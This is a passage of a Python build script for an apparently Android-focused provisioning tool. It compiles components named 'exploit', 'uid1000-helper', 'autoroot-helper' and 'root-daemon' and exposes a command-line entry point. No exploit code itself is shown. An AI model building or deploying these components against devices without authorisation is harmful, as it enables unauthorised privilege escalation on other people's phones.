    environment = android_build_environment(target)
    commands = [
        ["make", "-C", str(ROOT / "exploit"), "-j2", target.make_target]
    ]
    if build_audio:
        helper_target = "native-java" if target.audio_java_fallback else "native"
        commands.append(["make", "-C", str(ROOT / "helper"), helper_target])
        if target.audio_java_fallback:
            commands.append(
                [
                    "make", "-C", str(ROOT / "exploit"),
                    f"PORTAL_TARGET={target.make_target}", "audio-ctl",
                ]
            )
    if build_account:
        commands.append(
            [
                "make", "-C", str(ROOT / "exploit"),
                f"PORTAL_TARGET={target.make_target}", "account-ctl",
            ]
        )
    if build_components:
        commands.append(
            [
                "make", "-C", str(ROOT / "exploit"),
                f"PORTAL_TARGET={target.make_target}", "component-ctl",
            ]
        )
    if build_shizuku:
        commands.append(["make", "-C", str(ROOT / "shizuku-helper"), "all"])
    if build_autoroot:
        commands.append(["make", "-C", str(ROOT / "autoroot-helper"), "all"])
    if build_presence:
        commands.append(["make", "-C", str(ROOT / "presence-helper"), "all"])
    if build_uid1000:
        commands.append(
            [
                "make", "-B", "-C", str(ROOT / "uid1000-helper"),
                target.uid1000_helper_make_target,
            ]
        )
    if build_sentinel:
        commands.append(["make", "-C", str(ROOT / "exploit-sentinel"), "all"])
    if build_daemon:
        commands.append(["make", "-C", str(ROOT / "root-daemon")])
    for command in commands:
        result = subprocess.run(
            command, cwd=ROOT, env=environment, check=False
        )
        if result.returncode != 0:
            raise ProvisionError(f"build failed: {shlex.join(command)}")


def _cli_config() -> CliConfig:
    """Slice the CLI shell's constants from this module's globals.

    Built fresh on every call so the shell always sees this module's
    current values (the suite patches them here).
    """
    return CliConfig(
        version=PROVISIONER_VERSION,
        default_custom_payload=DEFAULT_CUSTOM_PAYLOAD_LOCAL,
        shizuku_version=SHIZUKU_VERSION,
        banner=PROVISIONER_BANNER,
    )


def parse_args() -> argparse.Namespace:
    return _cli_parse_args(_cli_config())


def main() -> int:
    return _cli_main(_cli_config(), PortalProvisioner)


if __name__ == "__main__":
    raise SystemExit(main())
